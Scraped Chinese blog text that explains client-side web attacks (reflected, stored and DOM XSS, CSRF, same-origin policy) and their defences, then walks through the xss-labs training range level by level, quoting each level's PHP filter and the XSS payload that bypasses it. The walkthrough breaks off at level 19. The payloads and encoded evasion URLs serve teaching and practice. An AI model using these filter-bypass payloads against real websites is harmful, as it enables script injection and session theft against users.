开发者会利用各种办法来相办法来过滤这些恶意篡改的请求，用户也很容易发现异常的链接，但是攻击者仍然可以用模糊的手法来进行绕过 例如： Url encoding: http://www.example.com/xss_test.php?inject=%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%63%69%61%6F%27%29%3B%3C%2F%73%63%72%69%70%74%3E 不使用 \u0026lt;script\u0026gt; tag： http://www.example.com/xss_test.php?inject=\u0026lt;img%20onerror=\u0026#34;javascript:%20alert(document.cookie);\u0026#34;%20src=asd\u0026gt; 动态执行（动态的构建恶意代码的内容） http://www.example.com/xss_test.php?inject=\u0026lt;script\u0026gt;eval(String.fromCharCode(97,108,101,114,116,40,39,99,105,97,111,39,41,59))\u0026lt;/script\u0026gt; 我们甚至可以将包含漏洞的链接通过短网址缩短或者转换为二维码来绕过检测 Stored XSS 存储型 XSS 存储型XSS顾名思义，恶意代码会先被攻击者存储在网页的服务端的数据库当中，当用户访问该网站时，存储的恶意代码会被服务端自动嵌入HTML中，然后由浏览器解析执行，造成危害。 那么这种攻击一般就发生在用户可以获取其他用户进行的输入，常见的就有论坛或者留言板等内容。 存储型XSS与反射型XSS最大的区别就是它是persistent持久的，并且所有能够获取恶意代码内容的用户都会收到影响，同时用户的防备更小，因为网页链接是正常的，而在正常加载中却出现了恶意代码的执行，可谓防不胜防。 总结来说Stored XSS的执行分两步走 Step1 攻击者上传还有恶意脚本代码的内容到服务器 服务器长期存储这些恶意脚本代码（存储到数据库中） Step2 受害者访问这些有漏洞的网页 服务器从数据库中取出恶意脚本代码嵌入返回给受害者的网页中 继而浏览器自动解析和执行这些恶意脚本代码 DOM-based XSS 在介绍DOM XSS之前，我们需要首先了解一下DOM是什么： DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签，以及其他的信息，并提供了API供JS等脚本语言对页面内容进行查询与修改。我们可以通过浏览器的开发者工具来查看网页的DOM内容。 我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档， \u0026lt;body onload=\u0026#34;window.alert(\u0026#39;welcome to my home page!\u0026#39;);\u0026#34;\u0026gt; 还可以为网页创建标签，写入内容等信息。 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; // run this function when the document is loaded window.onload = function() { // create a couple of elements // in an otherwise empty HTML page heading = document.createElement(\u0026#34;h1\u0026#34;); heading_text = document.createTextNode(\u0026#34;Big Head!\u0026#34;); heading.appendChild(heading_text); document.body.appendChild(heading); } \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 那么我们回到 DOM XSS，其与前面两种XSS的最大的区别就在于，攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 其步骤一般为： 攻击者构造一段含有一段直接篡改DOM结构的代码的链接然后发送给受害者 受害者点击链接并向服务器请求网页 服务器端收到请求，但是看不懂也无法执行篡改DOM结构的代码，直接将其与原本合法的网页返回给客户端 客户端解析网页同时发现有修改DOM结构的代码，解析执行，造成危害 XSS的危害 BeEF以及各类XSS平台都提供了自动脚本，只需要将组织好的脚本插入，就可以执行自己想要的操作 CSRF Cross-Site Request Forgery (CSRF, 读做 \u0026ldquo;sea-surf\u0026rdquo;)，其主要目标是利用用户已经登录的登录凭证（session cookie）来执行一系列越权的操作。 CSRF的主要执行流程为： 受害者先登录存在漏洞的网站，并且保存session cookie的内容在本地，无需重复登录 黑客向受害者发送一个恶意网站的链接（链接中只可以包含网址），受害者点击后请求该网页的资源 这个网页中带有隐藏表格来自动发起POST请求，向存在漏洞的目标网站发送恶意操作的请求（例如修改账号密码） 此举能够成功是因为浏览器在发送请求的时候，会自动带上该域名下的所有本地存储的cookie，也就是相当于是本人发出的修改请求 而用户本人可以对次完全不知情 我们这里可以总结一下CSRF与XSS的区别，我们假设存在漏洞的网站为 www.vulnerable.com，黑客构造的网页叫做 www.malicious.com 在XSS中要完成的目标是，诱导用户点击 www.vulnerable.com 的链接（DOM，Reflected需要修改url，Stored则不需要），然后使浏览器在当前页面下执行恶意代码，例如直接盗取cookie 在CSRF中要完成的目标是，诱导用户点击 www.malicious.com 的链接，www.malicious.com的网页内容中会自动地向 www.vulnerable.com 发起HTTP请求，同时浏览器会附带上所有域名www.vulnerable.com下的cookie，从而伪装成用户对服务器端造成影响 Same-origin policy 浏览器的同源策略 看到了上面的例子之后，我想提出一个问题？为什么我们不能直接从第三方网站获取目标网站下的cookie呢？ 这里就涉及到了浏览器的同源策略 同源策略的是各个浏览器用于限制不同源的网页直接进行资源交换的行为的一种安全策略 我们这里需要强调同源策略是由浏览器制定的，用于保护存放在浏览器上的内容，比如相当重要的session cookie，我们知道可以利用 document.cookie 来获取当前页面的cookie，如果没有同源策略，那么黑客就可以通过注入JS脚本来获取用户存放与客户端的所有内容，也可以继续调用DOM的API进行DOM内容的修改以及访问，这是非常危险的。 Definition of an origin 同源的概念 两个URLs如果被称为同源，他们必须要保证协议(http/https),端口（如果被指定了的话）一致，访问资源的路径不一样没有关系 我们通过一个例子来解释 针对URL： http://store.company.com/dir/page.html URL 类别 原因 http://store.company.com/dir2/other.html 同源 只有路径不同 http://store.company.com/dir/inner/another.html 同源 只有路径不同 https://store.company.com/page.html 不同源 协议不同 http://store.company.com:81/dir/page.html 不同源 端口号不同 http://news.company.com/dir/page.html 不同源 Host不同 跨站网络访问 不同源的网页之间进行交互的方式一般由三种： Cross-origin writes 跨站写操作：一般来说是被允许的。比如页面中的链接（links），重定向以及表单提交 Cross-origin embedding 跨站资源嵌入：一般来说也是被允许的 Cross-origin reads 跨站读操作：一般来说是不被允许的，即从一个网页向另一个网页直接获取数据 跨站资源嵌入的一些例子： \u0026lt;script src=\u0026rdquo;\u0026hellip;\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; 标签嵌入跨站脚本。语法错误信息只能被同源脚本中捕捉到。 \u0026lt;link rel=\u0026ldquo;stylesheet\u0026rdquo; href=\u0026quot;\u0026hellip;\u0026quot;\u0026gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨站需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 通过 \u0026lt;img\u0026gt; 展示的图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,\u0026hellip; 通过 \u0026lt;video\u0026gt; 和 \u0026lt;audio\u0026gt; 播放的多媒体资源。 通过 \u0026lt;object\u0026gt;、 \u0026lt;embed\u0026gt; 和 \u0026lt;applet\u0026gt; 嵌入的插件。 通过 @font-face 引入的字体。一些浏览器允许跨站字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。 通过 \u0026lt;iframe\u0026gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨站交互。 如何允许跨站访问 可以通过由服务端发回的HTTP响应中，添加 CORS field来指定那些host可以加载资源 如何阻止跨站访问 阻止跨站写操作，只要检测请求中的一个不可推测的标记(CSRF token)即可，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。你必须使用这个标记来阻止页面的跨站读操作。 阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。 阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。浏览器可能不会遵守 Content-Type 头部定义的类型。例如，如果您在HTML文档中指定 \u0026lt;script\u0026gt; 标记，则浏览器将尝试将标签内部的 HTML 解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。 跨站数据存储访问 Cookies 使用不同的源定义方式。一个页面可以为本域和其父域设置 cookie，只要是父域不是公共后缀（public suffix）即可。Firefox 和 Chrome 使用 Public Suffix List 检测一个域是否是公共后缀（public suffix）。 Countermeasure 如何防范针对WEB客户端的攻击 我们可以将主要的对策分为两种 客户端 客户端的防御依赖于用户的安全意识以及一些浏览器还有插件的辅助 尽量访问原始网站，不要访问那些后面带着很多GET参数的链接 默认关闭JS来避免恶意代码的执行 在访问比较敏感的网页的时候尽量不要访问其他的网站 及时关闭重启浏览器 服务端 XSS HttpOnly cookie: 服务端给一些重要的cookie设置 HttpOnly 属性，从而避免这些cookie被脚本语言所调用查看以及利用 Input validation 输入检查： 对于所有的用户输入我们都需要进行严格的检查以及过滤，组织一些恶意脚本的插入（e.g. htmlspecialchars() in php） Output validation \u0026amp; HTML encode 输出检查与HTML编码： 我们除了对用户发送过来的HTTP请求进行检查，还需要在返回HTML代码之前进行二次检查，因为可能在服务器端的脚本执行之后，一些恶意的代码被嵌入到了HTML代码中，因此我们可以通过例如 HTML encode 的方法将特殊字符全部转换为 HTML entities 来避免这样的情况发生 CSRF Two-factor authentication (e.g.,验证码) 因为在CSRF中，往往在用户毫不知情的情况下就发生了针对用户账号的攻击，那么我们可以设置双重认证来保护那些重要的操作必须在用户的许可下才能执行 CSRF tokens Referer检查 检查请求是否是通过合理的域名下跳转而来的，比如提交表单是由发帖页面跳转而来。 CSRF tokens CSRF tokens是由服务端产生的，在用户登录之后在HTTP Response中发送给客户端，客户端将这个token存储在本地，例如添加一个隐藏的字段中 当用户再次向服务器端发送请求的时候，服务器端就会检查token是否在HTTP header当中，从而预防CSRF 因为通过黑客的网站发出的请求，只能最多包含cookie的内容，却不能包含存在于原始页面中的隐藏token，导致访问失败 Reference XSS 从零开始 Pikachu靶场通关之Cross-site request forgery Same-origin policy 《白帽子讲web安全》 ","date":"2022-05-19T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/client_side_attacks/","title":"Client-side Attacks 针对客户端的Web攻击"},{"content":"XSS 挑战之旅 靶场：https://github.com/do0dl3/xss-labs 在线靶场：http://test.ctf8.com/ 参考wp：http://zhuabapa.top/2019/12/10/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/ level1 我们观察url可以发现有一个叫做 name 的GET参数，我们直接修改它就是完成一个反射型XSS http://test.ctf8.com/level1.php?name=test \u0026lt;h2 align=\u0026ldquo;center\u0026rdquo;\u0026gt;欢迎用户test\u0026lt;/h2\u0026gt; 我们通过闭合\u0026lt;/h2\u0026gt;并在里面加入JS \u0026lt;/h2\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; level2 level2我们同样观察前端html代码，然后通过闭合input tag的内容弹出JS \u0026lt;input name=\u0026#34;keyword\u0026#34; value=\u0026#34;test\u0026#34;\u0026gt; \u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt; 这里为什么我们不能像level1里面一样使用 \u0026lt;h2\u0026gt; 来进行js的注入呢，我们可以来看一下源码 echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; 这里是使用了函数 htmlspecialchars 来将特殊字符转换为HTML实体（无法被解析的string？）,因此无法完成闭合与JS代码的执行 \u0026amp; (ampersand) becomes \u0026amp;amp; \u0026quot; (double quote) becomes \u0026amp;quot; \u0026rsquo; (single quote) becomes \u0026amp;#039; \u0026lt; (less than) becomes \u0026amp;lt; \u0026gt; (greater than) becomes \u0026amp;gt; level3 echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#34;\u0026lt;center\u0026gt; \u0026lt;form action=level3.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#39;\u0026#34;.htmlspecialchars($str).\u0026#34;\u0026#39;\u0026gt; 检查源代码，发现两边的$str都被替换了，因此我们必须要绕过这些特殊字符，利用标签内的attribute进行绕过 这边建议大家可以检查一下 检查源码 以及浏览器 inspector 里面的源码的区别，以检查源码得到的html为标准，进行引号的闭合 \u0026#39; onclick=\u0026#39;alert(1) 然后补充一下关于 htmlspecialchars 的使用，默认是不过滤引号的，可以在参数中设置flag来进行过滤，也就是为什么我们在这里还可以使用引号来进行绕过 level4 检查源码的内容，发现这里对于括号都进行了替换，但是还是没有加入对于引号的检查和转换，所以还是和level3一样的套路 $str = $_GET[\u0026#34;keyword\u0026#34;]; $str2=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str); $str3=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str2); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level4.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str3.\u0026#39;\u0026#34;\u0026gt; 这次需要用双引号，建议大家多做尝试，然后看一下源码的显示 \u0026#34; onclick=\u0026#34;alert(1) level5 检查源码，对于 \u0026lt;script\u0026gt; 以及 on 进行了替换，那么我们就需要找到新的注入姿势， $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level5.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str3.\u0026#39;\u0026#34;\u0026gt; 我们通过用 \u0026lt;a\u0026gt; 直接写入一个链接来进行js的执行 \u0026#34;\u0026gt; \u0026lt;a href=javascript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level6 增加了过滤的tag种类，但是可以通过改变大小写绕过 $str2=str_replace(\u0026#34;\u0026lt;script\u0026#34;,\u0026#34;\u0026lt;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level6.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str6.\u0026#39;\u0026#34;\u0026gt; \u0026#34;\u0026gt; \u0026lt;a hRef=javascript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level7 在level6的基础上加上了大小写的过滤，老思路，单纯的替换则可以利用双写绕过 $str =strtolower( $_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;\u0026#34;,$str5); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level7.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.$str6.\u0026#39;\u0026#34;\u0026gt; 注意一下，这里还有一个 script 需要双写 \u0026#34;\u0026gt; \u0026lt;a hrhrefef=javascscriptript:alert(1)\u0026gt; XSS \u0026lt;/a\u0026gt; level8 在level7的基础上，增加了双引号的过滤，同时加入下划线对tag进行破坏 $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); echo \u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level8.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=添加友情链接 /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;?php echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$str7.\u0026#39;\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39; 我们可以使用 %09 进行换行来避免下划线，但是不能在输入框内完成，需要放在url中才能被正常解析 keyword=javascr%09ipt:alert(1) 可以使用html编码 \u0026amp;#106;\u0026amp;#97;\u0026amp;#118;\u0026amp;#97;\u0026amp;#115;\u0026amp;#99;\u0026amp;#114;\u0026amp;#105;\u0026amp;#112;\u0026amp;#116;\u0026amp;#58;\u0026amp;#97;\u0026amp;#108;\u0026amp;#101;\u0026amp;#114;\u0026amp;#116;\u0026amp;#40;\u0026amp;#49;\u0026amp;#41; level9 在level8的基础上加入了对于url的审核，但是只检查是否存在 http:// ,放到alert的内容即可 $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;scr_ipt\u0026#34;,$str); $str3=str_replace(\u0026#34;on\u0026#34;,\u0026#34;o_n\u0026#34;,$str2); $str4=str_replace(\u0026#34;src\u0026#34;,\u0026#34;sr_c\u0026#34;,$str3); $str5=str_replace(\u0026#34;data\u0026#34;,\u0026#34;da_ta\u0026#34;,$str4); $str6=str_replace(\u0026#34;href\u0026#34;,\u0026#34;hr_ef\u0026#34;,$str5); $str7=str_replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\u0026amp;quot\u0026#39;,$str6); echo \u0026#39;\u0026lt;center\u0026gt; \u0026lt;form action=level9.php method=GET\u0026gt; \u0026lt;input name=keyword value=\u0026#34;\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt; \u0026lt;input type=submit name=submit value=添加友情链接 /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt;\u0026#39;; ?\u0026gt; \u0026lt;?php if(false===strpos($str7,\u0026#39;http://\u0026#39;)) { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;您的链接不合法？有没有！\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } else { echo \u0026#39;\u0026lt;center\u0026gt;\u0026lt;BR\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;.$str7.\u0026#39;\u0026#34;\u0026gt;友情链接\u0026lt;/a\u0026gt;\u0026lt;/center\u0026gt;\u0026#39;; } ?\u0026gt; ?keyword=javascr%09ipt:alert(\u0026#39;http://\u0026#39;)\u0026amp;submit=添加友情链接 level10 我们仔细看源码，虽然在keyword这里做了括号的替换，导致无法闭合 \u0026lt;h2\u0026gt; 但是这里还有一个t_sort可以利用，我们要做的就是插入JS，同时让这个隐藏的输入框出现可以被点击 $str = $_GET[\u0026#34;keyword\u0026#34;]; $str11 = $_GET[\u0026#34;t_sort\u0026#34;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; 注意要用双引号 \u0026amp;t_sort=\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level11 通过观察源码我们发现level10中的t_sort也无法闭合了，但是出现了需要修改的HTTP-REFERER来完成注入 $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_SERVER[\u0026#39;HTTP_REFERER\u0026#39;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_ref\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; HTTP_USER_AGENT: \u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level12 与level11一样的套路，只不过是换一个header罢了，然后别忘了显示输入框 $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_ua\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; User-Agent:\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level13 修改cookie setcookie(\u0026#34;user\u0026#34;, \u0026#34;call me maybe?\u0026#34;, time()+3600); ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;keyword\u0026#34;]; $str00 = $_GET[\u0026#34;t_sort\u0026#34;]; $str11=$_COOKIE[\u0026#34;user\u0026#34;]; $str22=str_replace(\u0026#34;\u0026gt;\u0026#34;,\u0026#34;\u0026#34;,$str11); $str33=str_replace(\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026#34;,$str22); echo \u0026#34;\u0026lt;h2 align=center\u0026gt;没有找到和\u0026#34;.htmlspecialchars($str).\u0026#34;相关的结果.\u0026lt;/h2\u0026gt;\u0026#34;.\u0026#39;\u0026lt;center\u0026gt; \u0026lt;form id=search\u0026gt; \u0026lt;input name=\u0026#34;t_link\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_history\u0026#34; value=\u0026#34;\u0026#39;.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_sort\u0026#34; value=\u0026#34;\u0026#39;.htmlspecialchars($str00).\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;t_cook\u0026#34; value=\u0026#34;\u0026#39;.$str33.\u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34;\u0026gt; Cookie: user=\u0026#34; type=\u0026#34;text\u0026#34; onclick=\u0026#34;alert(1) level14 没有正常加载暂且搁置 level15 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = $_GET[\u0026#34;src\u0026#34;]; echo \u0026#39;\u0026lt;body\u0026gt;\u0026lt;span class=\u0026#34;ng-include:\u0026#39;.htmlspecialchars($str).\u0026#39;\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/body\u0026gt;\u0026#39;; ?\u0026gt; AngularJS ng-include 函数可以用于嵌入html 我们通过嵌入level1的内容，同样可以执行想要的代码，这里要注意过滤了括号，所以要改变我们原来用在level1的payload ?src=\u0026#39;level1.php?name=\u0026lt;img src=x onerror=alert(1)\u0026gt;\u0026#39; level16 观察源码我们可以发现level16对于很多特殊字符都做了替换 $str = strtolower($_GET[\u0026#34;keyword\u0026#34;]); $str2=str_replace(\u0026#34;script\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str); $str3=str_replace(\u0026#34; \u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str2); $str4=str_replace(\u0026#34;/\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str3); $str5=str_replace(\u0026#34;\t\u0026#34;,\u0026#34;\u0026amp;nbsp;\u0026#34;,$str4); echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;.$str5.\u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; ?\u0026gt; \u0026lt;center\u0026gt;\u0026lt;img src=level16.png\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;?php echo \u0026#34;\u0026lt;h3 align=center\u0026gt;payload的长度:\u0026#34;.strlen($str5).\u0026#34;\u0026lt;/h3\u0026gt;\u0026#34;; ?\u0026gt; 我们可以用html编码来绕过，但是之前的方式都需要闭合 \u0026lt;h3\u0026gt; ，但现在斜杠被过滤，我们只能采取一种新的方法，就是我们用在level15中的 img tag keyword=\u0026lt;img%0asrc=1%0aonerror=alert(1)\u0026gt; level17 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#34;\u0026lt;embed src=xsf01.swf?\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#34; width=100% heigth=100%\u0026gt;\u0026#34;; ?\u0026gt; embed标签可以嵌入swf文件（flash） 设置一个onmouseover事件，鼠标放到上面即可，firefox确实试不出来，chrome可以，应该是某种安全机制 ?arg01=a\u0026amp;arg02=%20onmouseover=alert(1) level18 level18在level17的基础上加了特殊字符的过滤，但是我们原本的payload也够用了 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#34;\u0026lt;embed src=xsf02.swf?\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#34; width=100% heigth=100%\u0026gt;\u0026#34;; ?\u0026gt; ?arg01=a\u0026amp;arg02=%20onmouseover=alert(1) level19 \u0026lt;?php ini_set(\u0026#34;display_errors\u0026#34;, 0); echo \u0026#39;\u0026lt;embed src=\u0026#34;xsf03.swf?\u0026#39;.htmlspecialchars($_GET[\u0026#34;arg01\u0026#34;]).\u0026#34;=\u0026#34;.htmlspecialchars($_GET[\u0026#34;arg02\u0026#34;]).\u0026#39;\u0026#34; width=100% heigth=100%\u0026gt;\u0026#39;; ?\u0026gt; 使用工具jpexs-decompiler 对xsf03.swf flash文件进行反汇编，找到可以放入xss注入代码的地方 首先定位到函数getURL，这里应该是会获取当前网页的url version的内容可以决定 loc4_ 的值 检测到又 \u0026lt;a\u0026gt; 形成的link才会执行 